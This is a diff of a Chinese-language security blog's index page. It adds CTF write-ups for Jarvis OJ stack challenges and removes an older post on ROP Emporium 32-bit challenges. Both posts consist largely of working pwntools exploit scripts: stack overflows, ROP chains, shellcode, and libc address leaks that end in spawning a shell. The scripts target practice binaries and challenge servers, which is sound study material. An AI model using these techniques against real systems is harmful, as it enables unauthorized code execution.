@@ -252,6 +252,221 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/27/pwn学习（10）jarvis栈部分（一）/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/27/pwn学习（10）jarvis栈部分（一）/" itemprop="url">pwn学习（10）jarvis栈部分</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-27T21:20:28+08:00">
+                2018-11-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>中级ROP基本上看完了，打算做一些题目练练手，想到了之前学习逆向的时候jarvis oj上有题目的汇总，就去看了看，顺便把栈部分的题目都试着做了一下，恰好今天还算是有空，就写写wp吧</p>
+<h1 id="Tell-me-something"><a href="#Tell-me-something" class="headerlink" title="Tell me something"></a>Tell me something</h1><p>入门题目，漏洞很明显，而且直接就给了可以拿到flag的函数，溢出覆盖返回地址即可<br><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxmxu66bmdj311s0bsjtz.jpg" alt=""><br>exp如下：</p>
+<pre><code>from pwn import *
+#p = process(&apos;./guestbook&apos;)
+p = remote(&apos;pwn.jarvisoj.com&apos;,9876)
+elf = process(&apos;./guestbook&apos;)
+
+payload = 0x88*&apos;a&apos; + p64(0x400620)
+#gdb.attach(p)
+p.sendline(payload)
+p.interactive()
+</code></pre><p>唯一需要注意的是这个主函数有点坑，没有push ebp，所以在计算pad的时候要注意一下</p>
+<h1 id="test-your-memory"><a href="#test-your-memory" class="headerlink" title="test your memory"></a>test your memory</h1><p>漏洞同样很明显，而且还给了cat flag的地址作为提示，我们只要覆盖返回地址就好了<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxmy00vlp4j30pm08wabu.jpg" alt=""><br>也没什么需要特别注意的地方，本地测试脚本的时候可以准备个假的flag文件，exp如下：<br>    from pwn import *</p>
+<pre><code>#p = process(&apos;./memory&apos;)
+p = remote(&apos;pwn2.jarvisoj.com&apos;, 9876)
+elf = ELF(&apos;./memory&apos;)
+pad = 0x13 *&apos;a&apos;
+fakeebp = &apos;aaaa&apos;
+system_addr = elf.plt[&apos;system&apos;]
+bin_addr = elf.search(&apos;cat flag&apos;).next()
+p.recvuntil(&apos;&gt; &apos;)
+payload = pad + fakeebp + p32(system_addr) + p32(system_addr) + p32(bin_addr)
+#gdb.attach(p)
+p.sendline(payload)
+p.interactive()
+</code></pre><h1 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h1><p>太简单了，只放exp了<br>    from pwn import *</p>
+<pre><code>#p = process(&apos;./level0&apos;)
+p = remote(&apos;pwn2.jarvisoj.com&apos;,9881)
+elf = ELF(&apos;./level0&apos;)
+pad = 0x80 *&apos;a&apos;
+fakeebp = &apos;aaaaaaaa&apos;
+payload = pad + fakeebp + p64(elf.symbols[&apos;callsystem&apos;])
+p.sendline(payload)
+p.interactive()
+</code></pre><h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><p>同样很简单，exp如下：<br>    from pwn import *<br>    p = remote(‘pwn2.jarvisoj.com’,9877)<br>    shellcode = asm(shellcraft.sh())<br>    p.recvuntil(“What’s this:”)<br>    buf_addr = p.recv()[0:10]<br>    log.info(buf_addr)<br>    buf_addr = int(buf_addr,16)<br>    log.info(buf_addr)<br>    payload = shellcode.ljust(140,’a’) + p32(buf_addr)<br>    p.sendline(payload)<br>    p.interactive()</p>
+<h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p>依旧很简单。。。<br>    from pwn import *</p>
+<pre><code>#p = process(&apos;./level2&apos;)
+p = remote(&apos;pwn2.jarvisoj.com&apos;,9878)
+elf = ELF(&apos;./level2&apos;)
+
+system_addr = elf.plt[&apos;system&apos;]
+bin_addr = 0x804A024
+payload = 140*&apos;a&apos; + p32(system_addr) + &quot;aaaa&quot; + p32(bin_addr)
+p.sendline(payload)
+p.interactive()
+</code></pre><h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p>很明显的溢出，但是没有system函数，也没有/bin/sh，那我们就考虑泄漏libc了，程序调用过了write，但就用这个函数了<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxmy8skp9oj30ha06udgl.jpg" alt=""><br>exp如下：<br>    from pwn import *</p>
+<pre><code>#p = process(&apos;./level3&apos;)
+p = remote(&apos;pwn2.jarvisoj.com&apos;,9879)
+elf = ELF(&apos;./level3&apos;)
+#libc = ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)
+libc=ELF(&apos;./libc-2.19.so&apos;)
+pad = 0x88 * &apos;a&apos;
+fakeebp = &apos;aaaa&apos;
+write_addr = elf.plt[&apos;write&apos;]
+main_addr = 0x804844B
+payload = pad + fakeebp + p32(write_addr) + p32(main_addr) + p32(1) + p32(elf.got[&apos;write&apos;]) + p32(4)
+p.recvuntil(&apos;Input:\n&apos;)
+p.sendline(payload)
+write_addr = u32(p.recv(4))
+log.info(write_addr)
+
+libc_write=libc.symbols[&apos;write&apos;]
+libc_system=libc.symbols[&apos;system&apos;]
+libc_sh=libc.search(&apos;/bin/sh&apos;).next()
+
+system_addr= write_addr-libc_write+libc_system
+sh_addr=write_addr-libc_write+libc_sh
+
+payload2 = pad + fakeebp + p32(system_addr) + &apos;dead&apos; + p32(sh_addr)
+p.sendline(payload2)
+
+p.interactive()
+</code></pre><h1 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h1><p>这个题目成功挡住了我，先拿ida看看<br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxmydm4zuaj30hq05m74u.jpg" alt=""><br>看上去和上一个题没啥区别……还是要泄漏libc。<br>做的时候偷了个懒，直接拿上个题的脚本试了试，结果本地成了……当时还以为题目放重了，结果remote的时候出错了，这才意识到题目没给libc，这就很尴尬了。<br>怎么解决没有libc的问题呢？这时候就要用到一个新武器了—-DynELF。<br>这里给个网址，官方介绍的很详细了<br><a href="https://pwntoolsdocinzh-cn.readthedocs.io/en/master/dynelf.html" target="_blank" rel="noopener">https://pwntoolsdocinzh-cn.readthedocs.io/en/master/dynelf.html</a><br>exp如下：<br>    from pwn import <em><br>    context(arch = ‘i386’, os = ‘linux’)<br>    r = remote(‘pwn2.jarvisoj.com’, 9880)<br>    e=ELF(‘./level4’)<br>    junk=’A’</em>(0x88+0x04)<br>    read_plt=e.symbols[‘read’]<br>    write_plt=e.symbols[‘write’]<br>    data_bss_addr=e.symbols[‘__bss_start’]<br>    func_reload_addr=e.symbols[‘vulnerable_function’]<br>    def leak(address):<br>        payload1=junk+p32(write_plt)+p32(func_reload_addr)+p32(0x01)+p32(address)+p32(0x04)<br>        r.sendline(payload1)<br>        leak_addr=r.recv(4)<br>        return leak_addr<br>    d=DynELF(leak,elf=e)<br>    system_addr=d.lookup(‘system’,’libc’)<br>    payload2=junk+p32(read_plt)+p32(func_reload_addr)+p32(0x00)+p32(data_bss_addr)+p32(0x08)<br>    r.sendline(payload2)<br>    r.send(‘/bin/sh\x00’)<br>    payload3=junk+p32(system_addr)+p32(func_reload_addr)+p32(data_bss_addr)<br>    r.send(payload3)<br>    r.interactive()</p>
+<p>Successful</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/26/pwn学习（9）中级ROP（一）/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -2038,180 +2253,6 @@ sh.interactive()
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/18/pwn学习（3）ROP-Emporium32位练习/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Asa9ao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Asa9ao">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/18/pwn学习（3）ROP-Emporium32位练习/" itemprop="url">pwn学习（3）ROP Emporium32位练习</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-18T19:33:02+08:00">
-                2018-11-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>因为刚刚入门，所以找了个练习ROP的地方，题目应该说都不难，算是练练手吧</p>
-<p>第一题第二题实在是太简单了就不说了，基本上就是ctf wiki里面前几个入门题的难度，直接跳到第三个</p>
-<h2 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h2><p>说实话这题我是没什么思路的，因为他有个.so程序很麻烦，但是后来看了大佬们的wp发现自己想多了，题目提示给的很清楚了，就是要分别调用callme_one、two、three三个函数，并且都要求参数是1、2、3，那么我们就有思路了，首先我们要明确一下这三个函数的plt地址，当然直接调用ELF的plt[]就好了，主要问题是我们如何去传递三个参数</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14f537133d.jpg" alt="1.jpg"></p>
-<p>其实还是老思路，利用ROPgadgets找到合适的gadget然后构造ROP chain就可以了，这里我们就选择倒数第三个了</p>
-<p>天时地利都有了，上exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./callme32'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./callme32'</span>)</span><br><span class="line">one_addr = elf.plt[<span class="string">'callme_one'</span>]</span><br><span class="line">two_addr = elf.plt[<span class="string">'callme_two'</span>]</span><br><span class="line">three_addr = elf.plt[<span class="string">'callme_three'</span>]</span><br><span class="line">pop_addr = <span class="number">0x080488a9</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">44</span></span><br><span class="line">payload+= p32(one_addr)+p32(pop_addr)+p32(<span class="number">1</span>)+p32(<span class="number">2</span>)+p32(<span class="number">3</span>)</span><br><span class="line">payload+= p32(two_addr)+p32(pop_addr)+p32(<span class="number">1</span>)+p32(<span class="number">2</span>)+p32(<span class="number">3</span>)</span><br><span class="line">payload+= p32(three_addr)+p32(pop_addr)+p32(<span class="number">1</span>)+p32(<span class="number">2</span>)+p32(<span class="number">3</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h2><p>说实话我没搞懂为什么这个题目为啥叫这个名字……还是ida先看一下</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14f4909e87.jpg" alt="2.jpg"></p>
-<p>嗯，有system函数但没有/bin/sh字符串，也就是说我们的任务就是想办法把/bin/sh写进去</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14f4b0c1da.jpg" alt="3.jpg"></p>
-<p>可以看到bss段恰好有合适的空间可以放，那下一步就该找合适的gadgets来构造rop chain了</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14f5a59406.jpg" alt="4.jpg"></p>
-<p>可以看到正好有将ebp写入edi地址的mov以及pop ebp和edi，我们就利用这两个来实现写入bss段，最后再通过system函数就搞定了。话不多说，上exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">p = process(<span class="string">'./write432'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./write432'</span>)</span><br><span class="line">data_addr = <span class="number">0x804A040</span></span><br><span class="line">system_addr = elf.plt[<span class="string">'system'</span>]</span><br><span class="line">mov_edi_ebp = <span class="number">0x8048670</span></span><br><span class="line">pop_edi_ebp = <span class="number">0x80486da</span></span><br><span class="line">pad = <span class="number">44</span>*<span class="string">'a'</span></span><br><span class="line">payload = pad + p32(pop_edi_ebp) + p32(data_addr) + <span class="string">'/bin'</span> + p32(mov_edi_ebp)</span><br><span class="line">payload += p32(pop_edi_ebp) + p32(data_addr + <span class="number">4</span>) + <span class="string">'/sh\x00'</span> + p32(mov_edi_ebp)</span><br><span class="line">payload += p32(system_addr) + <span class="string">'b'</span>*<span class="number">4</span> + p32(data_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><p>可以看到这道题比起前面的题目就是多了个bad char的检测，也就是说我们不能够输入一些程序认为的“敏感”字符了，那我们应该怎么办呢？其实思路很简单，我们可以先将字符串加密处理，把加密后的字符串写进去，然后在进行解密处理，如此一来就绕过了bad char的检测</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14f5b28a5d.jpg" alt="5.jpg"></p>
-<p>思路大致还是构造rop chain，但是这次我们要寻找一下能够实现加密功能的gadgets，比如add、xor这样的指令，并且还得有配合写入寄存器的pop指令，我们直接拿工具搜索一下</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14f5d4045d.jpg" alt="6.jpg"></p>
-<p>可以看到确实有我们需要的gadgets，我们简单梳理一下思路，首先我们要把我们的目标字符串写入目标地址，这里可以借助上一个题目的思路将字符串mov进去，而xor的是ebx和cl，那我们就需要pop这两个寄存器实现写入内容，其中一个是加密的密钥，另外一个就应该是我们的字符串所在地址，思路有了就顺着写exp就好了，上代码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./badchars32'</span>)</span><br><span class="line">system_addr = elf.plt[<span class="string">'system'</span>]</span><br><span class="line">xor_ebx_cl = <span class="number">0x8048890</span></span><br><span class="line">pop_ebx_ecx = <span class="number">0x8048896</span></span><br><span class="line">mov_edi_esi = <span class="number">0x8048893</span></span><br><span class="line">pop_edi_esi = <span class="number">0x8068899</span></span><br><span class="line">data_addr = <span class="number">0x804A040</span></span><br><span class="line">bin = <span class="string">'/bin/sh\x00'</span></span><br><span class="line">xor_byte = <span class="number">0x1b</span></span><br><span class="line"></span><br><span class="line">bad_char = [<span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x63</span>, <span class="number">0x2f</span>, <span class="number">0x20</span>, <span class="number">0x66</span>, <span class="number">0x6e</span>, <span class="number">0x73</span>]</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">xor_bin=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> bin:</span><br><span class="line">c = ord(i)^xor_byte</span><br><span class="line"><span class="keyword">if</span> c <span class="keyword">in</span> bad_char:</span><br><span class="line">xor_byte += <span class="number">0x1</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">xor_bin+=chr(c)</span><br><span class="line"><span class="keyword">if</span> len(xor_bin)==<span class="number">8</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">pad = <span class="string">'a'</span>*<span class="number">44</span></span><br><span class="line"></span><br><span class="line">payload = pad + p32(pop_edi_esi) +xor_bin[:<span class="number">4</span>]+ p32(data_addr) +p32(mov_edi_esi) + p32(pop_edi_esi)+xor_bin[<span class="number">4</span>:<span class="number">8</span>]+p32(data_addr+<span class="number">4</span>) +p32(mov_edi_esi)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(xor_bin)):</span><br><span class="line">payload += p32(pop_ebx_ecx) + p32(data_addr+i) + p32(xor_byte) + p32(xor_ebx_cl)</span><br><span class="line">payload+= p32(system_addr) + <span class="number">4</span>*<span class="string">'a'</span> +p32(data_addr)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./badchars32'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><p>这次题目和之前的也没区别，还是只有system，需要我们自己去写入/bin/sh，我们最理想的应该是类似mov [edi] ebp这样的指令了，但是gadgets没有那么合适的了，需要我们花一番心思去构造，我们可以先看一看这次的gadgets都有些什么</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14f4fea639.jpg" alt="7.jpg"></p>
-<p>可以看到可用的mov指令就这一个，还拖家带口了一堆别的指令。那第一步的思路就清楚了，把data的地址想办法给ecx，把字符串想办法给edx，那问题就又来了，我们没有现成的pop指令啊，唯一的一个pop是ebx的</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14f50d9455.jpg" alt="8.jpg"></p>
-<p>仔细观察了一番发现竟然又个xchg可以用来交换数据，那就是说我们可以在edx和ecx之间交换数据了，也就是说经过这道工序我们只需要想一个办法把edx或者ecx的其中一个能够写入数据，剩下的一个也就不攻自破了</p>
-<p><img src="https://i.loli.net/2018/11/18/5bf14f5183f79.jpg" alt="9.jpg"></p>
-<p>接着我们又找到了xor edx edx，这可以把edx置为0，而xor edx ebx在edx为0的时候就相当于把ebx的值给了edx啊，也就是说我们可以通过写入ebx，同时将edx置为0，然后二者xor使得edx变为我们写入的数据！这样我们就有了构造rop chain的基本思路！开写</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&apos;./fluff32&apos;)</span><br><span class="line">elf = ELF(&apos;./fluff32&apos;)</span><br><span class="line">system_addr = elf.plt[&apos;system&apos;]</span><br><span class="line">data_addr = 0x0804a028</span><br><span class="line">mov_ecx_edx = 0x8048693</span><br><span class="line">xchg_edx_ecx = 0x8048689</span><br><span class="line">xor_edx_ebx = 0x804867b</span><br><span class="line">xor_edx_edx = 0x8048671</span><br><span class="line">pop_ebx = 0x080483e1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def mov_bin_sh(addr,data):</span><br><span class="line">pad = 4*&apos;a&apos;</span><br><span class="line">payload=&quot;&quot;</span><br><span class="line">payload+=p32(xor_edx_edx)+pad+p32(pop_ebx)+p32(addr)+p32(xor_edx_ebx)+pad+p32(xchg_edx_ecx)+pad</span><br><span class="line">payload+=p32(xor_edx_edx)+pad+p32(pop_ebx)+data+p32(xor_edx_ebx)+pad</span><br><span class="line">payload+=p32(mov_ecx_edx)+pad+p32(0)</span><br><span class="line">return payload</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos; *44</span><br><span class="line">payload+=mov_bin_sh(data_addr,&apos;/bin&apos;)</span><br><span class="line">payload+=mov_bin_sh(data_addr+4,&apos;/sh\x00&apos;)</span><br><span class="line">payload+=p32(system_addr)+4*&apos;a&apos;+p32(data_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>Exp很简单，就一个地方需要特殊说明一下，为什么最后mov_bin_sh需要+p32(0)呢？这是因为我们执行的mov_ecx_edx的gadget在最后会先pop ebp、pop ebx，而之后将xor [ecx] bl，所以我们需要把ebx设为0，这样任何数xor0都等于它本身，这样也就是实现了我们的ecx不变的目的</p>
-<p>另外这些题目也可以用泄漏got的方法拿到libc里的/bin/sh字符，这里就贴出exp，有兴趣的可以c试一试，要比组织rop chain简单不少</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context(log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">p = process(<span class="string">'./fluff32'</span>)</span><br><span class="line">e = ELF(<span class="string">'./fluff32'</span>)</span><br><span class="line"><span class="comment">#libc = ELF("/lib/i386-linux-gnu/libc.so.6")</span></span><br><span class="line">puts_plt = e.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line">main = e.symbols[<span class="string">'pwnme'</span>]</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(flat([<span class="string">'A'</span> * <span class="number">44</span>, puts_plt, main, puts_got]))</span><br><span class="line">puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">log.info(<span class="string">"putsaddr : 0x%x"</span> % puts_addr)</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line"><span class="comment">#libc_addr = puts_addr - libc.symbols["puts"]</span></span><br><span class="line"><span class="comment">#log.info("libc : 0x%x" % libc_addr)</span></span><br><span class="line"><span class="comment">#system_addr = libc_addr + libc.symbols["system"]</span></span><br><span class="line"><span class="comment">#binsh_addr = 427065 + libc_addr</span></span><br><span class="line"><span class="comment">#log.info("bin : 0x%x" % binsh_addr)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">log.info(<span class="string">"libc : 0x%x"</span> % libcbase)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">log.info(<span class="string">"bin : 0x%x"</span> % binsh_addr)</span><br><span class="line">p.sendline(flat([<span class="string">'A'</span> * <span class="number">44</span>, system_addr, <span class="string">'b'</span>*<span class="number">4</span>, binsh_addr]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>successful</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2262,7 +2303,7 @@ sh.interactive()
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
